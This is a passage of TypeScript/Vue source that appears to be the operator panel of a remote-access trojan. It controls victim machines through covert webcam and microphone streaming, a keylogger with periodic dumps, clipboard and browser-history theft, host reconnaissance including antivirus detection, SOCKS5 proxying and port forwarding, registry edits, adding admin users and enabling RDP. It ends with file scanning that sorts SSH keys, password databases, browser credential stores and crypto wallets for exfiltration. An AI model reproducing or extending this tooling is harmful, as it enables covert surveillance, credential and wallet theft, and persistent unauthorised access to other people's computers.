        webcamMeta.value = `${res.data.width || '?'}x${res.data.height || '?'} | ${formatFileSize(res.data.size || 0)} | 拍照`
      }
    } else {
      webcamError.value = res.error || '拍照失败'
    }
  } catch (e: any) {
    webcamError.value = e?.response?.data?.error || '请求失败'
  } finally {
    webcamLoading.value = false
  }
}

let webcamDecoder: any = null
let webcamPendingFrame: VideoFrame | ImageBitmap | null = null
let webcamRafId = 0
let webcamH264Configured = false
let webcamH264Ts = 0

// ── 摄像头 H.264 辅助函数（与屏幕端一致）──
function wcParseAnnexB(d: Uint8Array): Uint8Array[] {
  const out: Uint8Array[] = []; let i = 0
  while (i < d.length - 3) {
    let sc = 0
    if (d[i]===0 && d[i+1]===0 && d[i+2]===0 && i+3<d.length && d[i+3]===1) sc = 4
    else if (d[i]===0 && d[i+1]===0 && d[i+2]===1) sc = 3
    if (!sc) { i++; continue }
    const s = i + sc; let e = d.length
    for (let j = s + 1; j < d.length - 2; j++) {
      if (d[j]===0 && d[j+1]===0 && (d[j+2]===1 || (d[j+2]===0 && j+3<d.length && d[j+3]===1))) { e = j; break }
    }
    out.push(d.subarray(s, e)); i = e
  }
  return out
}
function wcParseAvcc(d: Uint8Array): Uint8Array[] {
  const out: Uint8Array[] = []
  let p = 0
  while (p + 4 <= d.length) {
    const l = (d[p] << 24) | (d[p + 1] << 16) | (d[p + 2] << 8) | d[p + 3]
    if (l <= 0 || p + 4 + l > d.length) return []
    out.push(d.subarray(p + 4, p + 4 + l))
    p += 4 + l
  }
  return p === d.length ? out : []
}
function wcParseH264Nalus(d: Uint8Array): Uint8Array[] {
  let nalus = wcParseAnnexB(d)
  if (nalus.length) return nalus
  nalus = wcParseAvcc(d)
  if (nalus.length) return nalus
  return d.length > 0 ? [d] : []
}
function wcNalusToAvcc(nalus: Uint8Array[]): Uint8Array {
  const total = nalus.reduce((s, n) => s + 4 + n.length, 0)
  const r = new Uint8Array(total); let o = 0
  for (const n of nalus) {
    const l = n.length
    r[o]=(l>>24)&0xFF; r[o+1]=(l>>16)&0xFF; r[o+2]=(l>>8)&0xFF; r[o+3]=l&0xFF
    r.set(n, o+4); o += 4+l
  }
  return r
}
function wcBuildAvcDesc(sps: Uint8Array, pps: Uint8Array): Uint8Array {
  const d = new Uint8Array(11 + sps.length + pps.length)
  d[0]=1; d[1]=sps[1]; d[2]=sps[2]; d[3]=sps[3]; d[4]=0xFF; d[5]=0xE1
  d[6]=(sps.length>>8)&0xFF; d[7]=sps.length&0xFF; d.set(sps, 8)
  d[8+sps.length]=1; d[9+sps.length]=(pps.length>>8)&0xFF; d[10+sps.length]=pps.length&0xFF
  d.set(pps, 11+sps.length)
  return d
}

function webcamRenderLoop() {
  const frame = webcamPendingFrame
  if (frame) {
    webcamPendingFrame = null
    const cvs = webcamCanvasRef.value
    if (cvs) {
      const fw = (frame as any).displayWidth || (frame as any).width
      const fh = (frame as any).displayHeight || (frame as any).height
      if (cvs.width !== fw || cvs.height !== fh) { cvs.width = fw; cvs.height = fh }
      cvs.getContext('2d')?.drawImage(frame as any, 0, 0)
      webcamHasFrame.value = true
    }
    if ('close' in frame) (frame as any).close()
  }
  if (webcamStreaming.value) webcamRafId = requestAnimationFrame(webcamRenderLoop)
}

function webcamHandleH264(frameData: Uint8Array, fw: number, fh: number, isKey: boolean) {
  const nalus = wcParseH264Nalus(frameData)
  if (!nalus.length) return

  // 关键帧：提取 SPS/PPS，构建 avcC description，配置解码器
  if (isKey && (!webcamH264Configured || !webcamDecoder)) {
    let sps: Uint8Array|null = null, pps: Uint8Array|null = null
    for (const n of nalus) { const t = n[0]&0x1F; if (t===7) sps=n; if (t===8) pps=n }
    if (sps && pps && typeof VideoDecoder !== 'undefined') {
      const desc = wcBuildAvcDesc(sps, pps)
      const cs = `avc1.${sps[1].toString(16).padStart(2,'0')}${sps[2].toString(16).padStart(2,'0')}${sps[3].toString(16).padStart(2,'0')}`
      if (webcamDecoder) try { webcamDecoder.close() } catch {}
      webcamDecoder = new VideoDecoder({
        output: (frame: any) => {
          if (webcamPendingFrame && 'close' in webcamPendingFrame) (webcamPendingFrame as any).close()
          webcamPendingFrame = frame
        },
        error: () => {
          webcamH264Configured = false
          if (webcamDecoder) { try { webcamDecoder.close() } catch {} webcamDecoder = null }
        }
      })
      webcamDecoder.configure({ codec: cs, codedWidth: fw, codedHeight: fh, description: desc, optimizeForLatency: true })
      webcamH264Configured = true; webcamH264Ts = 0
    }
  }
  if (!webcamDecoder || !webcamH264Configured) return

  // 过滤 SPS/PPS/AUD，转 AVCC 格式
  const vidNalus = nalus.filter(n => { const t=n[0]&0x1F; return t!==7&&t!==8&&t!==9 })
  if (!vidNalus.length) return
  const avcc = wcNalusToAvcc(vidNalus)
  try { webcamDecoder.decode(new EncodedVideoChunk({ type: isKey?'key':'delta', timestamp: webcamH264Ts, data: avcc })) }
  catch {
    webcamH264Configured = false
    if (webcamDecoder) { try { webcamDecoder.close() } catch {} webcamDecoder = null }
  }
  webcamH264Ts += 66667 // ~15fps (1000000/15)
}

function doWebcamStreamStart() {
  if (webcamWs) return
  webcamLoading.value = true
  webcamError.value = ''
  const isLocalHost = ['localhost', '127.0.0.1', '::1'].includes(location.hostname)
  const canUseH264 = typeof VideoDecoder !== 'undefined' && (location.protocol === 'https:' || isLocalHost)
  const streamCodec = canUseH264 ? 'h264' : 'jpeg'
  webcamFrameCount = 0
  webcamLastFrameTime = performance.now()
  webcamH264Configured = false
  webcamH264Ts = 0

  const token = localStorage.getItem('token') || ''
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:'
  const wsUrl = `${proto}//${location.host}/ws/webcam/${route.params.id}?token=${encodeURIComponent(token)}&codec=${streamCodec}`

  const ws = new WebSocket(wsUrl)
  ws.binaryType = 'arraybuffer'
  webcamWs = ws

  let codecName = streamCodec === 'h264' ? 'H.264' : 'JPEG'

  ws.onopen = () => {
    webcamStreaming.value = true
    webcamLoading.value = false
    webcamRafId = requestAnimationFrame(webcamRenderLoop)
  }

  ws.onmessage = async (ev: MessageEvent) => {
    if (typeof ev.data === 'string') {
      try {
        const msg = JSON.parse(ev.data)
        if (msg.type === 'error') webcamError.value = msg.message || '未知错误'
      } catch {}
      return
    }
    if (!(ev.data instanceof ArrayBuffer) || ev.data.byteLength < 7) return
    const hdr = new Uint8Array(ev.data, 0, 6)
    const codec = hdr[0]   // 0=JPEG, 1=H.264
    const flags = hdr[1]   // bit0=keyframe
    const fw = hdr[2] | (hdr[3] << 8)
    const fh = hdr[4] | (hdr[5] << 8)
    const frameData = new Uint8Array(ev.data, 6)

    if (codec === 1) {
      codecName = 'H.264'
      const isKey = (flags & 1) !== 0
      try { webcamHandleH264(frameData, fw, fh, isKey) }
      catch {
        webcamH264Configured = false
        if (webcamDecoder) { try { webcamDecoder.close() } catch {} webcamDecoder = null }
      }
    } else {
      codecName = 'JPEG'
      try {
        const blob = new Blob([frameData], { type: 'image/jpeg' })
        const bmp = await createImageBitmap(blob)
        if (webcamPendingFrame && 'close' in webcamPendingFrame) (webcamPendingFrame as any).close()
        webcamPendingFrame = bmp
      } catch {}
    }

    // FPS 统计
    webcamFrameCount++
    const now = performance.now()
    const dt = now - webcamLastFrameTime
    if (dt >= 1000) {
      const fps = (webcamFrameCount / (dt / 1000)).toFixed(1)
      webcamMeta.value = `${fw}x${fh} | ${codecName} | ${formatFileSize(ev.data.byteLength)} | ${fps} FPS`
      webcamFrameCount = 0
      webcamLastFrameTime = now
    }
  }

  ws.onerror = () => {
    webcamError.value = 'WebSocket 连接错误'
    webcamLoading.value = false
  }

  ws.onclose = () => {
    webcamStreaming.value = false
    webcamLoading.value = false
    webcamWs = null
    cancelAnimationFrame(webcamRafId)
    if (webcamDecoder) { try { webcamDecoder.close() } catch {} webcamDecoder = null }
    webcamH264Configured = false
  }
}

function doWebcamStreamStop() {
  if (webcamWs) {
    webcamWs.close()
    webcamWs = null
  }
  cancelAnimationFrame(webcamRafId)
  if (webcamDecoder) { try { webcamDecoder.close() } catch {} webcamDecoder = null }
  webcamH264Configured = false
  webcamStreaming.value = false
}

function saveWebcamImage() {
  const cvs = webcamCanvasRef.value
  if (!cvs) return
  cvs.toBlob((blob) => {
    if (!blob) return
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `webcam_${new Date().toISOString().replace(/[:.]/g, '-')}.jpg`
    a.click()
    URL.revokeObjectURL(url)
  }, 'image/jpeg', 0.92)
}

// ── 麦克风监听（WebSocket 实时流） ──
const micLoading = ref(false)
const micStreaming = ref(false)
const micError = ref('')
const micMeta = ref('')
const micAudioUrl = ref('')
const micCanvasRef = ref<HTMLCanvasElement | null>(null)
const micAudioRef = ref<HTMLAudioElement | null>(null)
let micWs: WebSocket | null = null
let micAudioCtx: AudioContext | null = null
let micNextPlayTime = 0

async function doMicStart() {
  micLoading.value = true
  micError.value = ''
  try {
    const res: any = await serverApi.micStreamStart(route.params.id as string)
    if (res.data?.status === 'started' || res.data?.status === 'already_running') {
      micStreaming.value = true
      connectMicWs()
    }
  } catch (e: any) { micError.value = e?.response?.data?.error || '启动麦克风失败' }
  finally { micLoading.value = false }
}

async function doMicStop() {
  try {
    await serverApi.micStreamStop(route.params.id as string)
  } catch {}
  micStreaming.value = false
  disconnectMicWs()
  micMeta.value = ''
  if (micAudioCtx) { try { micAudioCtx.close() } catch {} micAudioCtx = null }
  micNextPlayTime = 0
}

function connectMicWs() {
  disconnectMicWs()
  const token = localStorage.getItem('token') || ''
  const proto = location.protocol === 'https:' ? 'wss' : 'ws'
  const wsUrl = `${proto}://${location.host}/ws/mic/${route.params.id}?token=${token}`
  micWs = new WebSocket(wsUrl)
  micWs.onopen = () => { micError.value = '' }
  micWs.onmessage = (ev) => {
    if (typeof ev.data === 'string') {
      try {
        const msg = JSON.parse(ev.data)
        if (msg.error) {
          micError.value = msg.error
          doMicStop()
          return
        }
        if (msg.audio) processMicFrame(msg)
      } catch {}
    }
  }
  micWs.onclose = () => {
    if (micStreaming.value) {
      micError.value = '音频流连接断开'
      micStreaming.value = false
    }
  }
  micWs.onerror = () => { micError.value = '音频 WebSocket 连接失败' }
}

function disconnectMicWs() {
  if (micWs) { try { micWs.close() } catch {} micWs = null }
}

function processMicFrame(msg: any) {
  const b64 = msg.audio
  const rate = msg.rate || 16000
  const channels = msg.channels || 1
  const codec = msg.codec || 'pcm'
  const numSamples = msg.samples || 0
  micMeta.value = `${rate}Hz / ${codec === 'adpcm' ? 'ADPCM' : 'PCM'} / ${channels}ch`

  const raw = atob(b64)
  const bytes = new Uint8Array(raw.length)
  for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i)

  if (!micAudioCtx) {
    micAudioCtx = new AudioContext({ sampleRate: rate })
    micNextPlayTime = 0
  }

  let floats: Float32Array
  if (codec === 'adpcm') {
    floats = decodeImaAdpcm(bytes, numSamples)
  } else {
    const samples = new Int16Array(bytes.buffer)
    floats = new Float32Array(samples.length)
    for (let i = 0; i < samples.length; i++) floats[i] = samples[i] / 32768.0
  }

  // 精确调度：将音频缓冲排队播放，无间隙无重叠
  const audioBuffer = micAudioCtx.createBuffer(channels, floats.length, rate)
  audioBuffer.getChannelData(0).set(floats)
  const now = micAudioCtx.currentTime
  if (micNextPlayTime < now) micNextPlayTime = now + 0.01
  const source = micAudioCtx.createBufferSource()
  source.buffer = audioBuffer
  source.connect(micAudioCtx.destination)
  source.start(micNextPlayTime)
  micNextPlayTime += audioBuffer.duration

  drawMicWaveform(floats)
}

// IMA-ADPCM 解码器
const imaIndexTable = [-1,-1,-1,-1,2,4,6,8,-1,-1,-1,-1,2,4,6,8]
const imaStepTable = [
  7,8,9,10,11,12,13,14,16,17,19,21,23,25,28,31,34,37,41,45,50,55,60,66,73,80,88,97,107,118,
  130,143,157,173,190,209,230,253,279,307,337,371,408,449,494,544,598,658,724,796,876,963,
  1060,1166,1282,1411,1552,1707,1878,2066,2272,2499,2749,3024,3327,3660,4026,4428,4871,5358,
  5894,6484,7132,7845,8630,9493,10442,11487,12635,13899,15289,16818,18500,20350,22385,24623,
  27086,29794,32767
]
function decodeImaAdpcm(data: Uint8Array, numSamples: number): Float32Array {
  let predicted = data[0] | (data[1] << 8) | (data[2] << 16) | (data[3] << 24)
  if (predicted > 0x7FFFFFFF) predicted -= 0x100000000
  let index = data[4]
  if (index > 88) index = 88

  const out = new Float32Array(numSamples)
  let dataIdx = 5
  let highNibble = false

  for (let i = 0; i < numSamples; i++) {
    let nibble: number
    if (!highNibble) {
      nibble = data[dataIdx] & 0x0F
      highNibble = true
    } else {
      nibble = (data[dataIdx] >> 4) & 0x0F
      dataIdx++
      highNibble = false
    }

    const step = imaStepTable[index]
    let delta = step >> 3
    if (nibble & 4) delta += step
    if (nibble & 2) delta += step >> 1
    if (nibble & 1) delta += step >> 2
    if (nibble & 8) delta = -delta

    predicted += delta
    if (predicted > 32767) predicted = 32767
    if (predicted < -32768) predicted = -32768

    index += imaIndexTable[nibble]
    if (index < 0) index = 0
    if (index > 88) index = 88

    out[i] = predicted / 32768.0
  }
  return out
}

function drawMicWaveform(samples: Float32Array) {
  const canvas = micCanvasRef.value
  if (!canvas) return
  const ctx = canvas.getContext('2d')
  if (!ctx) return
  const w = canvas.width, h = canvas.height
  ctx.fillStyle = '#1a1a2e'
  ctx.fillRect(0, 0, w, h)
  ctx.strokeStyle = '#4ade80'
  ctx.lineWidth = 1.5
  ctx.beginPath()
  const step = Math.max(1, Math.floor(samples.length / w))
  for (let i = 0; i < w; i++) {
    const idx = i * step
    const v = idx < samples.length ? samples[idx] : 0
    const y = (1 - v) * h / 2
    if (i === 0) ctx.moveTo(0, y)
    else ctx.lineTo(i, y)
  }
  ctx.stroke()
}

// ── 窗口管理 ──
const winLoading = ref(false)
const winFilter = ref('')
const winList = ref<any[]>([])

const filteredWins = computed(() => {
  const f = winFilter.value.toLowerCase()
  if (!f) return winList.value
  return winList.value.filter((w: any) => w.title.toLowerCase().includes(f) || w.process.toLowerCase().includes(f) || String(w.pid).includes(f))
})

async function doWindowList() {
  winLoading.value = true
  try {
    const res: any = await serverApi.windowList(route.params.id as string)
    if (res.data?.windows) {
      winList.value = res.data.windows
    } else if (res.data?.error) {
      alert(res.data.error)
    }
  } catch (e: any) { alert(e?.response?.data?.error || '获取窗口列表失败') }
  finally { winLoading.value = false }
}

async function doWindowControl(hwnd: string, action: string) {
  try {
    const res: any = await serverApi.windowControl(route.params.id as string, String(hwnd), action)
    if (res.data?.message) {
      // 操作成功后刷新列表
      setTimeout(() => doWindowList(), 500)
    }
  } catch (e: any) { alert(e?.response?.data?.error || '窗口操作失败') }
}

// ── 进程管理 ──
const procLoading = ref(false)
const procKilling = ref(false)
const procFilter = ref('')
const procList = ref<any[]>([])

const filteredProcs = computed(() => {
  const f = procFilter.value.toLowerCase()
  if (!f) return procList.value
  return procList.value.filter((p: any) => p.name.toLowerCase().includes(f) || String(p.pid).includes(f) || (p.title && p.title.toLowerCase().includes(f)))
})

async function doProcessList() {
  procLoading.value = true
  try {
    const res: any = await serverApi.processList(route.params.id as string)
    if (res.data?.processes) {
      procList.value = res.data.processes.sort((a: any, b: any) => b.mem - a.mem)
    } else if (res.data?.error) {
      alert(res.data.error)
    }
  } catch (e: any) { alert(e?.response?.data?.error || '获取进程列表失败') }
  finally { procLoading.value = false }
}

async function doProcessKill(pid: number, name: string) {
  if (!confirm(`确定终止进程 ${name} (PID ${pid})?`)) return
  procKilling.value = true
  try {
    const res: any = await serverApi.processKill(route.params.id as string, pid)
    alert(res.data?.message || '操作完成')
    doProcessList()
  } catch (e: any) { alert(e?.response?.data?.error || '终止进程失败') }
  finally { procKilling.value = false }
}

// ── 服务管理 ──
const svcLoading = ref(false)
const svcFilter = ref('')
const svcList = ref<any[]>([])

const filteredSvcs = computed(() => {
  const f = svcFilter.value.toLowerCase()
  if (!f) return svcList.value
  return svcList.value.filter((s: any) => s.name.toLowerCase().includes(f) || s.display.toLowerCase().includes(f))
})

async function doServiceList() {
  svcLoading.value = true
  try {
    const res: any = await serverApi.serviceList(route.params.id as string)
    if (res.data?.services) {
      svcList.value = res.data.services.sort((a: any, b: any) => a.name.localeCompare(b.name))
    } else if (res.data?.error) {
      alert(res.data.error)
    }
  } catch (e: any) { alert(e?.response?.data?.error || '获取服务列表失败') }
  finally { svcLoading.value = false }
}

async function doServiceControl(name: string, action: string) {
  try {
    const res: any = await serverApi.serviceControl(route.params.id as string, name, action)
    alert(res.data?.message || '操作完成')
    doServiceList()
  } catch (e: any) { alert(e?.response?.data?.error || '操作失败') }
}

// ── 键盘记录 ──
const keylogRunning = ref(false)
const keylogDumping = ref(false)
const keylogData = ref('')
let keylogPollTimer: ReturnType<typeof setInterval> | null = null

async function doKeylogStart() {
  try {
    const res: any = await serverApi.keylogStart(route.params.id as string)
    if (res.data?.status === 'started' || res.data?.status === 'already_running') {
      keylogRunning.value = true
      keylogData.value = ''
      startKeylogPoll()
    }
  } catch (e: any) { alert(e?.response?.data?.error || '启动失败') }
}

async function doKeylogStop() {
  stopKeylogPoll()
  try {
    await serverApi.keylogStop(route.params.id as string)
    keylogRunning.value = false
    await doKeylogDump()
  } catch (e: any) { alert(e?.response?.data?.error || '停止失败') }
}

async function doKeylogDump() {
  keylogDumping.value = true
  try {
    const res: any = await serverApi.keylogDump(route.params.id as string)
    if (res.data?.data) {
      keylogData.value += res.data.data
    }
  } catch {}
  finally { keylogDumping.value = false }
}

function startKeylogPoll() {
  stopKeylogPoll()
  keylogPollTimer = setInterval(() => { doKeylogDump() }, 3000)
}

function stopKeylogPoll() {
  if (keylogPollTimer) { clearInterval(keylogPollTimer); keylogPollTimer = null }
}

// ── 系统信息收集 ──
const infoDumpLoading = ref(false)
const infoDumpResult = ref<any>(null)

async function doInfoDump() {
  infoDumpLoading.value = true
  infoDumpResult.value = null
  try {
    const res: any = await serverApi.infoDump(route.params.id as string)
    if (res.success && res.data) {
      const d = res.data
      // 归一化字段：DLL 返回 av(数组), env(对象), recentDocs(数组), network(数组)
      const normalized: any = {}
      if (d.hostname) normalized.hostname = d.hostname
      if (d.username) normalized.username = d.username
      if (d.domain) normalized.domain = d.domain
      if (d.os) normalized.os = d.os
      if (d.arch) normalized.arch = d.arch
      if (d.isAdmin !== undefined) normalized.isAdmin = d.isAdmin ? '是' : '否'
      if (d.domainInfo) normalized.domainInfo = d.domainInfo
      // 数组/对象 → 字符串
      if (Array.isArray(d.av) && d.av.length) normalized.antivirus = d.av.join(', ')
      if (Array.isArray(d.network) && d.network.length)
        normalized.network = d.network.map((n: any) => `${n.name}: ${n.ip} (${n.mac})`).join('\n')
      if (d.env && typeof d.env === 'object')
        normalized.env = Object.entries(d.env).map(([k, v]) => `${k}=${v}`).join('\n')
      if (Array.isArray(d.recentDocs) && d.recentDocs.length)
        normalized.recent_docs = d.recentDocs.join('\n')
      if (d.error) normalized.error = d.error
      infoDumpResult.value = normalized
    } else {
      alert(res.data?.error || res.error || '收集失败')
    }
  } catch (e: any) { alert(e?.response?.data?.error || '请求失败') }
  finally { infoDumpLoading.value = false }
}

// ── 剪贴板 ──
const clipLoading = ref(false)
const clipResult = ref('')

async function doClipboardDump() {
  clipLoading.value = true
  clipResult.value = ''
  try {
    const res: any = await serverApi.clipboardDump(route.params.id as string)
    if (res.success && res.data) clipResult.value = res.data.text || res.data.data || JSON.stringify(res.data)
    else alert(res.error || '获取失败')
  } catch (e: any) { alert(e?.response?.data?.error || '请求失败') }
  finally { clipLoading.value = false }
}

// ── SOCKS5 代理 ──
const socksRunning = ref(false)
const socksPort = ref(0)
const socksPortInput = ref(10800)
const socksAuthUser = ref('')
const socksAuthPass = ref('')
const socksLoading = ref(false)
const socksError = ref('')

async function doSocksStart() {
  socksLoading.value = true
  socksError.value = ''
  try {
    const res: any = await serverApi.socksStart(route.params.id as string, socksPortInput.value || 10800, socksAuthUser.value, socksAuthPass.value)
    if (res.success) {
      socksRunning.value = true
      socksPort.value = res.port
    } else {
      socksError.value = res.error || '启动失败'
    }
  } catch (e: any) { socksError.value = e?.response?.data?.error || '请求失败' }
  finally { socksLoading.value = false }
}

async function doSocksStop() {
  socksLoading.value = true
  socksError.value = ''
  try {
    await serverApi.socksStop(route.params.id as string)
    socksRunning.value = false
    socksPort.value = 0
  } catch (e: any) { socksError.value = e?.response?.data?.error || '停止失败' }
  finally { socksLoading.value = false }
}

async function doSocksRefresh() {
  try {
    const res: any = await serverApi.socksStatus(route.params.id as string)
    if (res.success && res.data) {
      socksRunning.value = res.data.running
      socksPort.value = res.data.port || 0
    }
  } catch {}
}

// ── 端口转发 ──
const pfList = ref<any[]>([])
const pfLoading = ref(false)
const pfError = ref('')
const pfLocalPort = ref<number | undefined>()
const pfRemoteHost = ref('')
const pfRemotePort = ref<number | undefined>()

async function doPfRefresh() {
  pfLoading.value = true
  pfError.value = ''
  try {
    const res: any = await serverApi.portForwardList(route.params.id as string)
    if (res.success) pfList.value = res.data || []
  } catch (e: any) { pfError.value = e?.response?.data?.error || '刷新失败' }
  finally { pfLoading.value = false }
}

async function doPfStart() {
  if (!pfLocalPort.value || !pfRemoteHost.value || !pfRemotePort.value) {
    pfError.value = '请填写完整的转发规则'
    return
  }
  pfLoading.value = true
  pfError.value = ''
  try {
    const res: any = await serverApi.portForwardStart(
      route.params.id as string, pfLocalPort.value, pfRemoteHost.value, pfRemotePort.value
    )
    if (res.success) {
      pfLocalPort.value = undefined
      pfRemoteHost.value = ''
      pfRemotePort.value = undefined
      await doPfRefresh()
    } else {
      pfError.value = res.error || '添加失败'
    }
  } catch (e: any) { pfError.value = e?.response?.data?.error || '请求失败' }
  finally { pfLoading.value = false }
}

async function doPfStop(localPort: number) {
  pfLoading.value = true
  pfError.value = ''
  try {
    await serverApi.portForwardStop(route.params.id as string, localPort)
    await doPfRefresh()
  } catch (e: any) { pfError.value = e?.response?.data?.error || '删除失败' }
  finally { pfLoading.value = false }
}

// ── 浏览器历史 ──
const bhLoading = ref(false)
const bhFilter = ref('')
const bhTab = ref('chromiumHistory')
const bhData = ref<any>(null)

const filteredBh = computed(() => {
  const data = bhData.value
  if (!data) return []
  const list = data[bhTab.value] || []
  const f = bhFilter.value.toLowerCase()
  if (!f) return list
  return list.filter((b: any) =>
    (b.url || '').toLowerCase().includes(f) || (b.name || '').toLowerCase().includes(f) ||
    (b.title || '').toLowerCase().includes(f) || (b.browser || '').toLowerCase().includes(f) ||
    (b.folder || '').toLowerCase().includes(f))
})

async function doBrowserHistory() {
  bhLoading.value = true
  try {
    const res: any = await serverApi.browserHistory(route.params.id as string)
    if (res.data) {
      bhData.value = res.data
    } else if (res.data?.error) { alert(res.data.error) }
  } catch (e: any) { alert(e?.response?.data?.error || '获取浏览器历史失败') }
  finally { bhLoading.value = false }
}

// ── 网络连接 ──
const netstatLoading = ref(false)
const netstatFilter = ref('')
const netstatList = ref<any[]>([])

const filteredNetstat = computed(() => {
  const f = netstatFilter.value.toLowerCase()
  if (!f) return netstatList.value
  return netstatList.value.filter((n: any) =>
    (n.proto || '').toLowerCase().includes(f) || (n.local || '').includes(f) || (n.remote || '').includes(f) ||
    (n.location || '').toLowerCase().includes(f) ||
    (n.state || '').toLowerCase().includes(f) || (n.process || '').toLowerCase().includes(f) || String(n.pid).includes(f))
})

async function doNetstat() {
  netstatLoading.value = true
  try {
    const res: any = await serverApi.netstat(route.params.id as string)
    const d = res.data
    if (d?.tcp || d?.udp) {
      const tcp = (d.tcp || []).map((r: any) => ({ ...r, proto: 'TCP' }))
      const udp = (d.udp || []).map((r: any) => ({ ...r, proto: 'UDP', state: '-', remote: '*:*' }))
      netstatList.value = [...tcp, ...udp]
    } else if (d?.connections) {
      netstatList.value = d.connections
    } else if (d?.error) {
      alert(d.error)
    }
  } catch (e: any) { alert(e?.response?.data?.error || '获取网络连接失败') }
  finally { netstatLoading.value = false }
}

// ── 已安装软件 ──
const swLoading = ref(false)
const swFilter = ref('')
const swList = ref<any[]>([])

const filteredSw = computed(() => {
  const f = swFilter.value.toLowerCase()
  if (!f) return swList.value
  return swList.value.filter((s: any) =>
    (s.name || '').toLowerCase().includes(f) || (s.publisher || '').toLowerCase().includes(f) || (s.version || '').includes(f))
})

async function doSoftwareList() {
  swLoading.value = true
  try {
    const res: any = await serverApi.softwareList(route.params.id as string)
    if (res.data?.software) {
      swList.value = res.data.software.map((s: any) => ({
        name: s.name, version: s.version, publisher: s.publisher,
        installDate: s.installDate || s.date || '-',
        uninstall: s.uninstall || '',
        location: s.location || ''
      }))
    } else if (res.data?.error) { alert(res.data.error) }
  } catch (e: any) { alert(e?.response?.data?.error || '获取软件列表失败') }
  finally { swLoading.value = false }
}

// ── 注册表编辑器 ──
const regLoading = ref(false)
const regPath = ref('HKLM\\SOFTWARE')
const regResult = ref<any>(null)
const regWriteName = ref('')
const regWriteType = ref('REG_SZ')
const regWriteData = ref('')

async function doRegBrowse() {
  regLoading.value = true
  try {
    const res: any = await serverApi.regBrowse(route.params.id as string, { path: regPath.value })
    if (res.success && res.data) {
      const d = res.data
      regResult.value = {
        path: d.path || '',
        subkeys: d.keys || d.subkeys || [],
        values: d.values || [],
        error: d.error || ''
      }
      if (d.path) regPath.value = d.path
    } else {
      regResult.value = { error: res.data?.error || res.error || '浏览失败' }
    }
  } catch (e: any) { regResult.value = { error: e?.response?.data?.error || '请求失败' } }
  finally { regLoading.value = false }
}

function regNavigate(subkey: string) {
  const current = regResult.value?.path || regPath.value
  regPath.value = current + '\\' + subkey
  doRegBrowse()
}

function regGoUp() {
  const current = regResult.value?.path || regPath.value
  const idx = current.lastIndexOf('\\')
  if (idx > 0) {
    regPath.value = current.substring(0, idx)
    doRegBrowse()
  }
}

async function doRegWrite() {
  if (!regWriteName.value && !regWriteData.value) return
  regLoading.value = true
  try {
    const res: any = await serverApi.regWrite(route.params.id as string, {
      path: regResult.value?.path || regPath.value,
      name: regWriteName.value,
      type: regWriteType.value,
      data: regWriteData.value,
    })
    if (res.success) { regWriteName.value = ''; regWriteData.value = ''; doRegBrowse() }
    else alert(res.error || '写入失败')
  } catch (e: any) { alert(e?.response?.data?.error || '写入失败') }
  finally { regLoading.value = false }
}

async function doRegDelete(name: string) {
  if (!confirm(`确定删除注册表值 "${name || '(默认)'}"?`)) return
  regLoading.value = true
  try {
    const res: any = await serverApi.regDelete(route.params.id as string, {
      path: regResult.value?.path || regPath.value,
      name,
    })
    if (res.success && (res.data?.ok !== false)) doRegBrowse()
    else alert(res.data?.error || res.error || '删除失败')
  } catch (e: any) { alert(e?.response?.data?.error || '删除失败') }
  finally { regLoading.value = false }
}

// ── 用户管理 ──
const userMgmtLoading = ref(false)
const userMgmtList = ref<any[]>([])
const newUserName = ref('')
const newUserPass = ref('')
const newUserAdmin = ref(false)

async function doUserList() {
  userMgmtLoading.value = true
  try {
    const res: any = await serverApi.userList(route.params.id as string)
    if (res.data?.users) {
      userMgmtList.value = res.data.users.map((u: any) =>
        typeof u === 'string' ? { name: u, fullName: '', comment: '', isAdmin: false, disabled: false } : u
      )
    } else if (res.data?.error) alert(res.data.error)
  } catch (e: any) { alert(e?.response?.data?.error || '获取用户列表失败') }
  finally { userMgmtLoading.value = false }
}

async function doUserAdd() {
  if (!newUserName.value || !newUserPass.value) { alert('请填写用户名和密码'); return }
  userMgmtLoading.value = true
  try {
    const res: any = await serverApi.userAdd(route.params.id as string, {
      username: newUserName.value, password: newUserPass.value, admin: newUserAdmin.value,
    })
    if (res.success) { newUserName.value = ''; newUserPass.value = ''; newUserAdmin.value = false; doUserList() }
    else alert(res.error || res.data?.error || '添加失败')
  } catch (e: any) { alert(e?.response?.data?.error || '添加失败') }
  finally { userMgmtLoading.value = false }
}

async function doUserDelete(name: string) {
  if (!confirm(`确定删除用户 "${name}"?`)) return
  userMgmtLoading.value = true
  try {
    const res: any = await serverApi.userDelete(route.params.id as string, { username: name })
    if (res.success) doUserList()
    else alert(res.error || res.data?.error || '删除失败')
  } catch (e: any) { alert(e?.response?.data?.error || '删除失败') }
  finally { userMgmtLoading.value = false }
}

// ── RDP 管理 ──
const rdpLoading = ref(false)
const rdpPort = ref(3389)
const rdpResult = ref('')

async function doRdpManage(action: string) {
  rdpLoading.value = true
  rdpResult.value = ''
  try {
    const params: any = { action }
    if (action === 'port') params.port = rdpPort.value
    const res: any = await serverApi.rdpManage(route.params.id as string, params)
    const d = res.data
    if (d?.ok) {
      const actionMap: Record<string, string> = { enabled: 'RDP 已启用', disabled: 'RDP 已禁用', port_changed: '端口已修改为 ' + (d.port || rdpPort.value) }
      rdpResult.value = actionMap[d.action] || '操作成功'
      if (d.port) rdpPort.value = d.port
    } else {
      rdpResult.value = d?.error || res.error || '操作失败'
    }
  } catch (e: any) { rdpResult.value = e?.response?.data?.error || '请求失败' }
  finally { rdpLoading.value = false }
}

// ── 敏感文件扫描 ──
const fileStealLoading = ref(false)
const fileStealResult = ref<any>(null)
const fileExfilLoading = ref(false)

function inferFileCategory(p: string): string {
  const l = (p || '').toLowerCase()
  if (l.includes('.ssh') || l.endsWith('.pem') || l.endsWith('.ppk') || l.endsWith('.key') || l.includes('id_rsa') || l.includes('id_ed25519') || l.includes('id_ecdsa') || l.endsWith('.pub') || l.includes('authorized_keys') || l.includes('known_hosts')) return 'ssh'
  if (l.includes('password') || l.includes('credential') || l.includes('secret') || l.endsWith('.kdbx') || l.endsWith('.kdb') || l.includes('logins.json') || l.includes('login data') || l.includes('key3.db') || l.includes('key4.db') || l.includes('web data')) return 'credential'
  if (l.includes('wallet') || l.includes('bitcoin') || l.includes('ethereum') || l.includes('mnemonic') || l.includes('seed')) return 'crypto'
